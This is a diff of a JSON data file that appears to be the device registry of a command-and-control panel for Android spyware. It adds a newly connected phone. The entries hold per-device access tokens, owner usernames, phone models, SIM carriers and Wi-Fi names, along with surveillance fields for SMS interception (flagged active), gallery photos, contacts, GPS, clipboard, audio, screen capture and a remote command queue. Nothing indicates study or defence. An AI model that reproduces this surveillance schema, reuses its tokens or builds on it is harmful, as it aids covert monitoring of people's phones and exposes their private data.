@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776845535450,
+    "lastSeen": 1776845538329,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -5958,5 +5958,37 @@
       "receivedAt": 1776843340147
     },
     "pendingVideo": null
+  },
+  {
+    "deviceId": "aimlock_3f3677b6",
+    "deviceName": "TECNO LE7",
+    "ownerUsername": "Zal7Sex",
+    "token": "e0d08160e2e7174ce4ecac4f3a5a0002",
+    "lastSeen": 1776845540623,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-22T08:12:20.623Z",
+    "deviceInfo": {
+      "model": "TECNO MOBILE LIMITED TECNO LE7",
+      "androidVersion": "Android 11",
+      "battery": 51,
+      "network": "WiFi: Zal7Sex Network",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
